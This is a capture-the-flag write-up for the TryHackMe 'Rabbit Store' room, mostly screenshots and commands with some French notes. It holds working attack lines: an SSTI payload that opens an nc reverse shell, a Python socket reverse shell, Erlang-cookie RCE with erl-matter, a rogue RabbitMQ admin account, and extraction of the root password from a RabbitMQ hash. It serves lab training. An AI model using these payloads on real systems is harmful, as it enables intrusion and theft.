![rabbit-store-1.png](rabbit-store-1.png)

[https://tryhackme.com/room/rabbitstore](https://tryhackme.com/room/rabbitstore)

![ip-vpn-2.png](Screens/ip-vpn-2.png)

```sh
sudo nmap -sC -sV <IP>
```

![nmap-3.png](Screens/nmap-3.png)

![nmap-4.png](Screens/nmap-4.png)

HTTP : 

```sh
curl <IP>
```

![curl-error-4.png](Screens/curl-error-4.png)

```sh
echo "<IP> cloudsite.thm" | sudo tee -a /etc/hosts && curl http://cloudsite.thm
```

![curl-resolv-5.png](Screens/curl-resolv-5.png)

OU

```sh
curl --resolve cloudsite.thm:80:<IP> http://cloudsite.thm
```
![curl-resolv-6.png](Screens/curl-resolv-6.png)

```sh
gobuster dir -u http://cloudsite.thm -w /usr/share/wordlists/dirb/big.txt -x php,html
```

![gobuster-1.png](Screens/gobuster-1.png)

![http-7.png](Screens/http-7.png)

![website-sign-in-1.png](Screens/website-sign-in-1.png)

```sh
gobuster dir -u http://storage.cloudsite.thm -w /usr/share/wordlists/dirb/big.txt -x php,html
```

![gobuster-2.png](Screens/gobuster-2.png)

![website-sign-up-2.png](Screens/website-sign-up-2.png)

![website-sign-in-3.png](Screens/website-sign-in-3.png)

![website-sign-in-4.png](Screens/website-sign-in-4.png)

![website-sign-in-5.png](Screens/website-sign-in-5.png)

![website-sign-in-6.png](Screens/website-sign-in-6.png)

![website-sign-in-7.png](Screens/website-sign-in-7.png)

```json
"subscription": "active",
```

![website-sign-in-8.png](Screens/website-sign-in-8.png)

![website-sign-in-9.png](Screens/website-sign-in-9.png)


![website-sign-in-10.png](Screens/website-sign-in-10.png)

![reverse-shell-5.png](Screens/reverse-shell-5.png)

![reverse-shell-6.png](Screens/reverse-shell-6.png)

```http
http://<IP>/test.txt
```

```sh
gobuster dir -u http://storage.cloudsite.thm/api -w /usr/share/wordlists/dirb/common.txt
```

![reverse-shell-8.png](Screens/reverse-shell-8.png)

TEST of SSRF vulnerability :

![reverse-shell-9.png](Screens/reverse-shell-9.png)

![reverse-shell-10.png](Screens/reverse-shell-10.png)

Test with the domaine name

![reverse-shell-11.png](Screens/reverse-shell-11.png)

![reverse-shell-12.png](Screens/reverse-shell-12.png)

Test directly with ip and the port 3000 (default of Express, visible on the X-Powered-By on the response) 

![reverse-shell-13.png](Screens/reverse-shell-13.png)

![reverse-shell-14.png](Screens/reverse-shell-14.png)

We discovered a new api url : 

```
/api/fetch_messeges_from_chatbot
```

RCE via SSTI :

```
Content-Type: application/json;charset=UTF-8

{
    "":""
}
```

![reverse-shell-15.png](Screens/reverse-shell-15.png)

```
Content-Type: application/json;charset=UTF-8

{
    "username":"admin"
}
```

![reverse-shell-16.png](Screens/reverse-shell-16.png)

A server side template injection is a vulnerability that occurs when a server renders user input as a template of some sort.

polygot SSTI

```
{"username":"${{<%[%'\"}}%\\."}
```

![reverse-shell-17.png](Screens/reverse-shell-17.png)

> You might wonder why a **Node.js** application using the **Express** framework returns an error from the **Jinja2** templating engine, which is typically used with **Python**. This is because the **Express** application forwards requests made to the `/api/fetch_messeges_from_chatbot` endpoint to an internal **Flask** application and returns its response.

![reverse-shell-18.png](Screens/reverse-shell-18.png)

```json
{"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <IP> 4444 >/tmp/f').read() }}"}
```

![reverse-shell-20.png](Screens/reverse-shell-20.png)

![reverse-shell-19.png](Screens/reverse-shell-19.png)

![reverse-shell-21.png](Screens/reverse-shell-21.png)

```sh
find . -name user.txt
```

```sh
find ~ -name root.txt
```

![reverse-shell-22.png](Screens/reverse-shell-22.png)

```
98d3a30fa86523c580144d317be0c47e
```

Root :

```sh
cat /etc/passwd
```

![root-1.png](Screens/root-1.png)

SUID :

```sh
find / -type f -perm -4000 2>/dev/null
```

![root-2.png](Screens/root-2.png)

Linpeas : 

![root-3.png](Screens/root-3.png)

![root-4.png](Screens/root-4.png)

![root-5.png](Screens/root-5.png)

![root-6.png](Screens/root-6.png)

Erlang :

```sh
cat /var/lib/rabbitmq/.erlang.cookie
```

![root-8.png](Screens/root-8.png)

```sh
git clone https://github.com/gteissier/erl-matter.git
```

![root-10.png](Screens/root-10.png)

```sh
chmod +x erl-matter/shell-erldp.py
```

![root-11.png](Screens/root-11.png)

```sh
./erl-matter/shell-erldp.py <IP> 25672 <COOKIE>
```

![root-12.png](Screens/root-12.png)

Reverse Shell :

```sh
nc -lvnp 4444
```

![root-15.png](Screens/root-15.png)

```sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
![root-13.png](Screens/root-13.png)

![root-14.png](Screens/root-14.png)

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```sh
chmod 600 .erlang.cookie
rabbitmqctl add_user imposter 123
rabbitmqctl set_user_tags imposter administrator
```

![root-16.png](Screens/root-16.png)

![root-17.png](Screens/root-17.png)

[https://stackoverflow.com/questions/12792856/what-ports-does-rabbitmq-use](https://stackoverflow.com/questions/12792856/what-ports-does-rabbitmq-use)

> PORT 4369 : Erlang utilise un démon de mappage de ports (epmd) pour la résolution des noms de nœuds dans un cluster. Les nœuds doivent pouvoir se joindre les uns aux autres et au démon de mappage de ports pour que le clustering fonctionne. 
> 
> PORT 35197 : défini par inet_dist_listen_min/max Les pare-feu doivent autoriser le trafic dans cette plage à passer entre les nœuds en cluster
> 
> Console de gestion RabbitMQ :
> 
> PORT 15672 pour RabbitMQ version 3.x
> PORT 55672 pour RabbitMQ pré 3.x
> Assurez-vous que le plug-in rabbitmq_management est activé, sinon vous ne pourrez pas accéder à la console de gestion sur ces ports.
> 
> PORT 5672 Port principal de RabbitMQ (AMQP)
> PORT 5671 AMQP chiffré TLS (si activé)
> Pour un cluster de nœuds, ils doivent être ouverts les uns aux autres sur 35197, 4369 et 5672.
> 
> Pour tous les serveurs qui souhaitent utiliser la file d'attente de messages, seul 5672 (ou éventuellement 5671) est requis.

```sh
curl -u "imposter:123" localhost:port http://localhost:15672/api/users
```

![root-18.png](Screens/root-18.png)

![root-19.png](Screens/root-19.png)

[https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm](https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm)

En gros, ça ressemble à ça : **base64(salt[4 bytes] + sha256(salt[4 bytes] + password))**

```python
#!/usr/bin/env python3
import hashlib  
import binascii  
  
# Get the hash  
user_hash = "<base64_encoded_hash>"  
# Convert the base64 encoded hash to binary  
password_hash = binascii.a2b_base64(user_hash)  
# Convert the binary hash to a hexadecimal string  
decoded_hash = password_hash.hex()  
# Split the decoded hash into two parts  
part1 = decoded_hash[:8]  
part2 = decoded_hash[8:]  
  
# Print only the part2  
print(part2)
```

![root-21.png](Screens/root-21.png)

```sh
chmod +x script.py
./script.py
```

> C'est le mot de passe `root`, et non un hash !

```sh
su root
```

![root-22.png](Screens/root-22.png)

```sh
find / -type f -name "root.txt" 2>/dev/null
```

```
cat /root/root.txt
```

![root-23.png](Screens/root-23.png)